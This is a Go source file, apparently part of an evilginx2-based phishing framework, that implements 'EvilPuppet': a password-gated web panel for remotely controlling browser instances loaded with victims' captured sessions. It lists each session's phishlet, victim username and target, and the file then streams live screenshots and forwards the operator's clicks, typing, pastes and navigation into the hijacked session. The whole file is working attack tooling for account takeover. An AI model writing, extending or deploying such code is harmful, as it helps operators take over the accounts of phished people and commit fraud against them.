package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/log"
)

// PuppetServer provides a web-based interface for remotely controlling puppet browser instances.
// It serves an HTML/JS UI and handles WebSocket connections for real-time screenshot streaming
// and input forwarding.
type PuppetServer struct {
	pm         *PuppetManager
	port       int
	password   string
	httpServer *http.Server
}

var wsUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 131072,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins since this is on a controlled server
	},
}

func NewPuppetServer(pm *PuppetManager, port int, password string) *PuppetServer {
	ps := &PuppetServer{
		pm:       pm,
		port:     port,
		password: password,
	}
	return ps
}

func (ps *PuppetServer) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/puppet/ws/", ps.handleWebSocket)
	mux.HandleFunc("/puppet/", ps.handleHTTP)

	ps.httpServer = &http.Server{
		Addr:    fmt.Sprintf(":%d", ps.port),
		Handler: mux,
	}

	go func() {
		log.Info("puppet server listening on port %d", ps.port)
		if err := ps.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("puppet server error: %v", err)
		}
	}()
	return nil
}

func (ps *PuppetServer) Stop() {
	if ps.httpServer != nil {
		ps.httpServer.Close()
	}
}

func (ps *PuppetServer) authenticate(r *http.Request) bool {
	if ps.password == "" {
		return true
	}
	if r.URL.Query().Get("key") == ps.password {
		return true
	}
	if r.Header.Get("X-Puppet-Key") == ps.password {
		return true
	}
	return false
}

func (ps *PuppetServer) handleHTTP(w http.ResponseWriter, r *http.Request) {
	if !ps.authenticate(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Parse puppet ID from URL path: /puppet/<id>
	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/")
	pathPart = strings.TrimSuffix(pathPart, "/")

	if pathPart == "" {
		// List page
		ps.serveListPage(w, r)
		return
	}

	puppetId, err := strconv.Atoi(pathPart)
	if err != nil {
		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
		return
	}

	_, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	ps.serveControlPage(w, r, puppetId)
}

func (ps *PuppetServer) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	if !ps.authenticate(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Parse puppet ID: /puppet/ws/<id>
	pathPart := strings.TrimPrefix(r.URL.Path, "/puppet/ws/")
	pathPart = strings.TrimSuffix(pathPart, "/")

	puppetId, err := strconv.Atoi(pathPart)
	if err != nil {
		http.Error(w, "Invalid puppet ID", http.StatusBadRequest)
		return
	}

	puppet, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("puppet ws: upgrade error: %v", err)
		return
	}
	defer conn.Close()

	log.Info("puppet [%d]: web control client connected from %s", puppetId, r.RemoteAddr)

	// Write mutex — gorilla/websocket does NOT support concurrent writers.
	// Both the screenshot goroutine and input handler write to the connection.
	var wmu sync.Mutex

	safeWrite := func(msgType int, data []byte) error {
		wmu.Lock()
		defer wmu.Unlock()
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		return conn.WriteMessage(msgType, data)
	}

	// Send initial status
	statusMsg := map[string]interface{}{
		"type":      "status",
		"status":    puppet.Status.String(),
		"sessionId": puppet.SessionId,
		"phishlet":  puppet.Phishlet,
		"username":  puppet.Username,
		"viewportW": puppet.viewportW,
		"viewportH": puppet.viewportH,
	}
	statusJSON, _ := json.Marshal(statusMsg)
	safeWrite(websocket.TextMessage, statusJSON)

	// Start a goroutine to stream screenshots
	screenCh, err := ps.pm.GetScreenChan(puppetId)
	if err != nil {
		log.Error("puppet ws: %v", err)
		return
	}

	stopCh := make(chan struct{})

	// Screenshot streaming goroutine
	go func() {
		urlTicker := time.NewTicker(2 * time.Second)
		defer urlTicker.Stop()

		for {
			select {
			case <-stopCh:
				return
			case frame, ok := <-screenCh:
				if !ok {
					return
				}
				if err := safeWrite(websocket.BinaryMessage, frame); err != nil {
					return
				}
			case <-urlTicker.C:
				currentURL, err := ps.pm.GetCurrentURL(puppetId)
				if err == nil && currentURL != "" {
					urlMsg := map[string]string{"type": "url", "url": currentURL}
					urlJSON, _ := json.Marshal(urlMsg)
					safeWrite(websocket.TextMessage, urlJSON)
				}
			}
		}
	}()

	// Set read deadline — refreshed on every message (keepalive pings extend it)
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	// Throttle inspect requests to avoid overloading CDP (max ~10/sec)
	var lastInspectTime time.Time
	var inspectMu sync.Mutex // protects lastInspectTime

	// Read input events from the client
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// Refresh deadline on every message received
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		var pi PuppetInput
		if err := json.Unmarshal(message, &pi); err != nil {
			continue
		}

		// Ignore keepalive pings
		if pi.Type == "ping" {
			continue
		}

		// Handle element inspector requests — run async so we don't block the read loop
		if pi.Type == "inspect" {
			inspectMu.Lock()
			now := time.Now()
			if now.Sub(lastInspectTime) < 100*time.Millisecond {
				inspectMu.Unlock()
				continue
			}
			lastInspectTime = now
			inspectMu.Unlock()

			go func(ix, iy float64) {
				info, err := ps.pm.InspectElementAt(puppetId, ix, iy)
				if err != nil {
					clearMsg := map[string]interface{}{"type": "highlight", "selector": "", "rect": [4]float64{0, 0, 0, 0}}
					clearJSON, _ := json.Marshal(clearMsg)
					safeWrite(websocket.TextMessage, clearJSON)
					return
				}

				highlightMsg := map[string]interface{}{
					"type":      "highlight",
					"selector":  info.Selector,
					"tag":       info.Tag,
					"inputType": info.InputType,
					"rect":      info.Rect,
					"text":      info.Text,
					"focusable": info.Focusable,
				}
				highlightJSON, _ := json.Marshal(highlightMsg)
				safeWrite(websocket.TextMessage, highlightJSON)
			}(pi.X, pi.Y)
			continue
		}

		if err := ps.pm.HandleInput(puppetId, pi); err != nil {
			errMsg := map[string]string{"type": "error", "message": err.Error()}
			errJSON, _ := json.Marshal(errMsg)
			safeWrite(websocket.TextMessage, errJSON)
		}
	}

	close(stopCh)
	log.Info("puppet [%d]: web control client disconnected", puppetId)
}

func (ps *PuppetServer) serveListPage(w http.ResponseWriter, r *http.Request) {
	key := r.URL.Query().Get("key")
	puppets := ps.pm.ListPuppets()

	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	html := `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EvilPuppet - Active Sessions</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0d1117; color: #c9d1d9; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; padding: 40px; }
h1 { color: #58a6ff; margin-bottom: 8px; font-size: 28px; }
.subtitle { color: #8b949e; margin-bottom: 32px; font-size: 14px; }
.puppet-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 16px; }
.puppet-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; transition: border-color 0.2s; }
.puppet-card:hover { border-color: #58a6ff; }
.puppet-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
.puppet-id { font-size: 18px; font-weight: 600; color: #f0f6fc; }
.status { padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 500; }
.status-running { background: #0d419d33; color: #58a6ff; border: 1px solid #1f6feb; }
.status-starting { background: #4d2d0033; color: #d29922; border: 1px solid #9e6a03; }
.status-stopped { background: #49060633; color: #f85149; border: 1px solid #da3633; }
.status-error { background: #49060633; color: #f85149; border: 1px solid #da3633; }
.puppet-details { font-size: 13px; color: #8b949e; line-height: 1.8; }
.puppet-details strong { color: #c9d1d9; }
.btn-control { display: inline-block; margin-top: 12px; padding: 6px 16px; background: #238636; color: #fff; border: 1px solid #2ea043; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 500; }
.btn-control:hover { background: #2ea043; }
.no-puppets { text-align: center; padding: 60px 20px; color: #8b949e; }
.no-puppets p { font-size: 16px; margin-bottom: 8px; }
.no-puppets code { background: #161b22; padding: 4px 8px; border-radius: 4px; color: #58a6ff; font-size: 14px; }
</style>
</head>
<body>
<h1>EvilPuppet</h1>
<p class="subtitle">Remote Browser Control - Active Puppet Sessions</p>`

	if len(puppets) == 0 {
		html += `<div class="no-puppets"><p>No active puppets</p><p>Launch one with <code>puppet launch &lt;session_id&gt; &lt;target_url&gt;</code></p></div>`
	} else {
		html += `<div class="puppet-grid">`
		for _, p := range puppets {
			statusClass := "status-" + p.Status.String()
			html += fmt.Sprintf(`<div class="puppet-card">
<div class="puppet-header"><span class="puppet-id">Puppet #%d</span><span class="status %s">%s</span></div>
<div class="puppet-details">
<strong>Session:</strong> #%d<br>
<strong>Phishlet:</strong> %s<br>
<strong>Username:</strong> %s<br>
<strong>Target:</strong> %s<br>
<strong>Started:</strong> %s
</div>
<a class="btn-control" href="/puppet/%d?key=%s">Open Control Panel</a>
</div>`, p.Id, statusClass, p.Status.String(), p.SessionId, p.Phishlet, p.Username, p.TargetURL, p.CreateTime.Format("2006-01-02 15:04:05"), p.Id, key)
		}
		html += `</div>`
	}

	html += `</body></html>`

	fmt.Fprint(w, html)
}

func (ps *PuppetServer) serveControlPage(w http.ResponseWriter, r *http.Request, puppetId int) {
	key := r.URL.Query().Get("key")
	puppet, ok := ps.pm.GetPuppet(puppetId)
	if !ok {
		http.Error(w, "Puppet not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, puppetControlHTML, puppetId, puppet.SessionId, puppet.Username, puppet.Phishlet, puppetId, key, puppet.viewportW, puppet.viewportH)
}

// puppetControlHTML is the embedded HTML/JS/CSS for the remote browser control interface.
// Format args: puppetId, sessionId, username, phishlet, puppetId (ws), key, viewportW, viewportH
var puppetControlHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EvilPuppet #%d - Remote Control</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { height: 100%%; overflow: hidden; }
body {
    background: #0d1117;
    color: #c9d1d9;
    font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    height: 100vh;
    user-select: none;
    -webkit-user-select: none;
}
.toolbar {
    display: flex;
    align-items: center;
    padding: 6px 10px;
    background: #161b22;
    border-bottom: 1px solid #30363d;
    gap: 6px;
    flex-shrink: 0;
    z-index: 10;
}
.toolbar button {
    background: #21262d;
    border: 1px solid #30363d;
    color: #c9d1d9;
    padding: 5px 10px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 15px;
    line-height: 1;
    transition: background 0.15s;
}
.toolbar button:hover { background: #30363d; }
.toolbar button:active { background: #484f58; }
.url-bar {
    flex: 1;
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #c9d1d9;
    padding: 5px 12px;
    font-size: 13px;
    font-family: 'SF Mono', 'Fira Code', monospace;
    outline: none;
    transition: border-color 0.15s;
}
.url-bar:focus { border-color: #58a6ff; }
.puppet-info {
    font-size: 11px;
    color: #8b949e;
    white-space: nowrap;
    padding: 0 8px;
}
.puppet-info .label { color: #58a6ff; font-weight: 600; }
.viewport-container {
    flex: 1;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    background: #010409;
    position: relative;
    line-height: 0;
    font-size: 0;
}
#viewport {
    cursor: crosshair;
    max-width: 100%%;
    max-height: 100%%;
    display: block;
    image-rendering: -webkit-optimize-contrast;
    margin: 0;
    padding: 0;
    vertical-align: top;
}
#highlight-overlay {
    position: absolute;
    border: 2px solid #58a6ff;
    background: rgba(88, 166, 255, 0.12);
    pointer-events: none;
    z-index: 3;
    transition: all 0.08s ease-out;
    display: none;
    border-radius: 2px;
}
#element-tooltip {
    position: absolute;
    background: #161b22ee;
    color: #c9d1d9;
    font-size: 11px;
    font-family: 'SF Mono', 'Fira Code', monospace;
    padding: 3px 7px;
    border-radius: 4px;
    border: 1px solid #30363d;
    pointer-events: none;
    z-index: 4;
    display: none;
    white-space: nowrap;
    max-width: 350px;
    overflow: hidden;
    text-overflow: ellipsis;
}
#element-tooltip .tag { color: #ff7b72; }
#element-tooltip .attr { color: #d2a8ff; }
#element-tooltip .val { color: #a5d6ff; }
.statusbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 3px 10px;
    background: #161b22;
    border-top: 1px solid #30363d;
    font-size: 11px;
    color: #484f58;
    flex-shrink: 0;
}
.status-dot {
    display: inline-block;
    width: 8px;
    height: 8px;
    border-radius: 50%%;
    margin-right: 6px;
    vertical-align: middle;
}
.status-dot.connected { background: #3fb950; box-shadow: 0 0 4px #3fb95088; }
.status-dot.disconnected { background: #f85149; box-shadow: 0 0 4px #f8514988; }
.status-dot.connecting { background: #d29922; box-shadow: 0 0 4px #d2992288; animation: pulse 1.5s infinite; }
@keyframes pulse { 0%%,100%% { opacity: 1; } 50%% { opacity: 0.4; } }
.loading-overlay {
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: #0d1117ee;
    z-index: 5;
    transition: opacity 0.3s;
}
.loading-overlay.hidden { opacity: 0; pointer-events: none; }
.loading-spinner {
    width: 40px; height: 40px;
    border: 3px solid #30363d;
    border-top-color: #58a6ff;
    border-radius: 50%%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 16px;
}
@keyframes spin { to { transform: rotate(360deg); } }
.loading-text { color: #8b949e; font-size: 14px; }
</style>
</head>
<body>
<div class="toolbar">
    <button id="btn-back" title="Back">&#9664;</button>
    <button id="btn-forward" title="Forward">&#9654;</button>
    <button id="btn-refresh" title="Refresh">&#8635;</button>
    <input type="text" class="url-bar" id="url-bar" placeholder="Enter URL and press Enter..." spellcheck="false" autocomplete="off">
    <div class="puppet-info">
        <span class="label">Session</span> #%d
        &middot; <span class="label">User</span> %s
        &middot; <span class="label">Phishlet</span> %s
    </div>
</div>

<div class="viewport-container" id="viewport-container">
    <div class="loading-overlay" id="loading">
        <div class="loading-spinner"></div>
        <div class="loading-text">Connecting to puppet browser...</div>
    </div>
    <img id="viewport" draggable="false">
    <div id="highlight-overlay"></div>
    <div id="element-tooltip"></div>
</div>

<div class="statusbar">
    <span id="status"><span class="status-dot connecting"></span>Connecting...</span>
    <span id="coords"></span>
    <span id="fps">-- fps</span>
</div>

<script>
(function() {
    const PUPPET_ID = %d;
    const WS_KEY = '%s';
    const VIEWPORT_W = %d;
    const VIEWPORT_H = %d;

    const viewport = document.getElementById('viewport');
    const urlBar = document.getElementById('url-bar');
    const statusEl = document.getElementById('status');
    const fpsEl = document.getElementById('fps');
    const coordsEl = document.getElementById('coords');
    const loadingEl = document.getElementById('loading');
    const highlightEl = document.getElementById('highlight-overlay');
    const tooltipEl = document.getElementById('element-tooltip');
    const containerEl = document.getElementById('viewport-container');

    let ws = null;
    let frameCount = 0;
    let lastFpsTime = Date.now();
    let lastInspectTime = 0;
    let reconnectDelay = 1000;
    let hasReceivedFrame = false;

    // Element inspector state: stores the last highlight response from server
    let currentElement = null; // {selector, tag, inputType, rect, focusable}

    function connect() {
        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = proto + '//' + location.host + '/puppet/ws/' + PUPPET_ID + '?key=' + WS_KEY;

        ws = new WebSocket(wsUrl);
        ws.binaryType = 'blob';

        ws.onopen = function() {
            setStatus('connected', 'Connected');
            reconnectDelay = 1000;
            if (window._pingInterval) clearInterval(window._pingInterval);
            window._pingInterval = setInterval(function() {
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({type: 'ping'}));
                }
            }, 15000);
        };

        ws.onclose = function() {
            setStatus('disconnected', 'Disconnected - reconnecting...');
            if (window._pingInterval) clearInterval(window._pingInterval);
            setTimeout(connect, reconnectDelay);
            reconnectDelay = Math.min(reconnectDelay * 1.5, 10000);
        };

        ws.onerror = function() {
            setStatus('disconnected', 'Connection error');
            if (window._pingInterval) clearInterval(window._pingInterval);
        };

        ws.onmessage = function(event) {
            if (event.data instanceof Blob) {
                if (!hasReceivedFrame) {
                    hasReceivedFrame = true;
                    loadingEl.classList.add('hidden');
                }
                const url = URL.createObjectURL(event.data);
                const oldUrl = viewport.src;
                viewport.src = url;
                if (oldUrl && oldUrl.startsWith('blob:')) URL.revokeObjectURL(oldUrl);
                frameCount++;
                const now = Date.now();
                if (now - lastFpsTime >= 1000) {
                    fpsEl.textContent = frameCount + ' fps';
                    frameCount = 0;
                    lastFpsTime = now;
                }
            } else {
                try {
                    const msg = JSON.parse(event.data);
                    if (msg.type === 'url') {
                        if (document.activeElement !== urlBar) urlBar.value = msg.url;
                    } else if (msg.type === 'highlight') {
                        handleHighlight(msg);
                    } else if (msg.type === 'error') {
                        console.error('Puppet error:', msg.message);
                    }
                } catch(e) {}
            }
        };
    }

    // Render the highlight overlay and tooltip based on server response
    function handleHighlight(msg) {
        var rect = msg.rect;
        if (!rect || (rect[2] === 0 && rect[3] === 0) || !msg.selector) {
            highlightEl.style.display = 'none';
            tooltipEl.style.display = 'none';
            currentElement = null;
            return;
        }

        currentElement = {
            selector: msg.selector,
            tag: msg.tag,
            inputType: msg.inputType || '',
            focusable: msg.focusable || false
        };

        // Map viewport pixel coordinates to the displayed image's CSS coordinates
        var imgRect = viewport.getBoundingClientRect();
        var containerRect = containerEl.getBoundingClientRect();
        if (imgRect.width === 0 || imgRect.height === 0) return;

        var targetW = viewport.naturalWidth || VIEWPORT_W;
        var targetH = viewport.naturalHeight || VIEWPORT_H;
        var scaleX = imgRect.width / targetW;
        var scaleY = imgRect.height / targetH;

        // Element bounding box in viewport pixels -> CSS pixels on the displayed image
        var left = (rect[0] * scaleX) + (imgRect.left - containerRect.left);
        var top = (rect[1] * scaleY) + (imgRect.top - containerRect.top);
        var width = rect[2] * scaleX;
        var height = rect[3] * scaleY;

        highlightEl.style.display = 'block';
        highlightEl.style.left = left + 'px';
        highlightEl.style.top = top + 'px';
        highlightEl.style.width = width + 'px';
        highlightEl.style.height = height + 'px';

        // Color the highlight based on element type
        if (msg.focusable && (msg.tag === 'input' || msg.tag === 'textarea' || msg.tag === 'select')) {
            highlightEl.style.borderColor = '#3fb950';
            highlightEl.style.background = 'rgba(63, 185, 80, 0.12)';
        } else if (msg.tag === 'button' || msg.tag === 'a' || msg.focusable) {
            highlightEl.style.borderColor = '#d29922';
            highlightEl.style.background = 'rgba(210, 153, 34, 0.12)';
        } else {
            highlightEl.style.borderColor = '#58a6ff';
            highlightEl.style.background = 'rgba(88, 166, 255, 0.12)';
        }

        // Build tooltip text
        var tipText = '<span class="tag">' + escHtml(msg.tag) + '</span>';
        if (msg.inputType) {
            tipText += '<span class="attr">[type=</span><span class="val">"' + escHtml(msg.inputType) + '"</span><span class="attr">]</span>';
        }
        if (msg.selector && msg.selector.indexOf('#') === 0) {
            tipText += ' <span class="attr">' + escHtml(msg.selector) + '</span>';
        } else if (msg.selector && msg.selector.indexOf('[name=') !== -1) {
            var nameMatch = msg.selector.match(/\[name="([^"]+)"\]/);
            if (nameMatch) tipText += ' <span class="attr">name=</span><span class="val">"' + escHtml(nameMatch[1]) + '"</span>';
        }
        tooltipEl.innerHTML = tipText;

        // Position tooltip just below the highlight, or above if near bottom
        tooltipEl.style.display = 'block';
        var tipLeft = left;
        var tipTop = top + height + 4;
        if (tipTop + 25 > containerRect.height) {
            tipTop = top - 25;
        }
        if (tipLeft + 200 > containerRect.width) {
            tipLeft = containerRect.width - 210;
        }
        if (tipLeft < 0) tipLeft = 0;
        tooltipEl.style.left = tipLeft + 'px';
        tooltipEl.style.top = tipTop + 'px';
    }

    function escHtml(s) {
        return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function setStatus(state, text) {
        statusEl.innerHTML = '<span class="status-dot ' + state + '"></span>' + text;
    }

    function sendInput(msg) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(msg));
        }
    }

    function getScaledCoords(e) {
        var rect = viewport.getBoundingClientRect();
        if (rect.width === 0 || rect.height === 0) return null;

        var targetW = viewport.naturalWidth || VIEWPORT_W;
        var targetH = viewport.naturalHeight || VIEWPORT_H;
        var relX = e.clientX - rect.left;
        var relY = e.clientY - rect.top;

        if (relX < 0 || relX > rect.width || relY < 0 || relY > rect.height) return null;

        return {
            x: Math.round((relX / rect.width) * targetW),
            y: Math.round((relY / rect.height) * targetH)
        };
    }

    function getModifiers(e) {
        var mod = 0;
        if (e.altKey) mod |= 1;
        if (e.ctrlKey) mod |= 2;
        if (e.metaKey) mod |= 4;
        if (e.shiftKey) mod |= 8;
        return mod;
    }

    function buttonName(b) {
        return b === 1 ? 'middle' : b === 2 ? 'right' : 'left';
    }

    // Mouse events on the viewport
    viewport.addEventListener('mousedown', function(e) {
        if (e.button === 0) { e.preventDefault(); return; }
        var c = getScaledCoords(e);
        if (!c) return;
        sendInput({type: 'mousedown', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)});
        e.preventDefault();
    });

    viewport.addEventListener('mouseup', function(e) {
        if (e.button === 0) { e.preventDefault(); return; }
        var c = getScaledCoords(e);
        if (!c) return;
        sendInput({type: 'mouseup', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)});
        e.preventDefault();
    });

    viewport.addEventListener('click', function(e) {
        var c = getScaledCoords(e);
        if (!c) return;

        // If the element inspector has identified an element, click by selector
        var msg = {type: 'click', x: c.x, y: c.y, button: buttonName(e.button), modifiers: getModifiers(e)};
        if (currentElement && currentElement.selector) {
            msg.selector = currentElement.selector;
        }

        // Send mousemove first to trigger hover states
        sendInput({type: 'mousemove', x: c.x, y: c.y});
        setTimeout(function() { sendInput(msg); }, 50);
        e.preventDefault();
    });

    viewport.addEventListener('dblclick', function(e) {
        var c = getScaledCoords(e);
        if (!c) return;
        var msg = {type: 'click', x: c.x, y: c.y, button: 'left', modifiers: getModifiers(e)};
        if (currentElement && currentElement.selector) msg.selector = currentElement.selector;
        sendInput(msg);
        setTimeout(function() { sendInput(msg); }, 80);
        e.preventDefault();
    });

    viewport.addEventListener('mousemove', function(e) {
        var now = Date.now();
        var c = getScaledCoords(e);
        if (!c) return;

        // Update coordinate display
        coordsEl.textContent = c.x + ', ' + c.y;
        if (currentElement) {
            coordsEl.textContent += '  ' + currentElement.tag;
            if (currentElement.inputType) coordsEl.textContent += '[' + currentElement.inputType + ']';
        }

        // Send mousemove for hover states (throttled ~20/sec)
        if (now - lastInspectTime >= 50) {
            sendInput({type: 'mousemove', x: c.x, y: c.y});
        }

        // Send inspect request (throttled ~10/sec — server also throttles)
        if (now - lastInspectTime >= 100) {
            lastInspectTime = now;
            sendInput({type: 'inspect', x: c.x, y: c.y});
        }
    });

    // Hide highlight when mouse leaves the viewport
    viewport.addEventListener('mouseleave', function() {
        highlightEl.style.display = 'none';
        tooltipEl.style.display = 'none';
        currentElement = null;
        coordsEl.textContent = '';
    });

    viewport.addEventListener('wheel', function(e) {
        var c = getScaledCoords(e);
        if (!c) return;
        sendInput({type: 'scroll', x: c.x, y: c.y, deltaX: e.deltaX, deltaY: e.deltaY});
        e.preventDefault();
    }, {passive: false});

    viewport.addEventListener('contextmenu', function(e) { e.preventDefault(); });

    // Paste support — include selector for targeted input
    document.addEventListener('paste', function(e) {
        if (document.activeElement === urlBar) return;
        var text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) {
            var msg = {type: 'type', text: text};
            if (currentElement && currentElement.focusable && currentElement.selector) {
                msg.selector = currentElement.selector;
            }
            sendInput(msg);
        }
        e.preventDefault();
    });

    // Keyboard events
    document.addEventListener('keydown', function(e) {
        if (document.activeElement === urlBar) return;
        if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;

        if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
            var msg = {type: 'type', text: e.key};
            if (currentElement && currentElement.focusable && currentElement.selector) {
                msg.selector = currentElement.selector;
            }
            sendInput(msg);
        } else {
            sendInput({type: 'keydown', key: e.key, code: e.code, modifiers: getModifiers(e)});
        }
        e.preventDefault();
    });

    document.addEventListener('keyup', function(e) {
        if (document.activeElement === urlBar) return;
        if ((e.ctrlKey || e.metaKey) && e.key === 'v') return;
        if (e.key.length > 1 || e.ctrlKey || e.metaKey || e.altKey) {
            sendInput({type: 'keyup', key: e.key, code: e.code, modifiers: getModifiers(e)});
        }
        e.preventDefault();
    });

    // Navigation buttons
    document.getElementById('btn-back').addEventListener('click', function() { sendInput({type: 'back'}); });
    document.getElementById('btn-forward').addEventListener('click', function() { sendInput({type: 'forward'}); });
    document.getElementById('btn-refresh').addEventListener('click', function() { sendInput({type: 'refresh'}); });

    urlBar.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            sendInput({type: 'navigate', url: urlBar.value});
            urlBar.blur();
        }
    });

    connect();
})();
</script>
</body>
</html>`
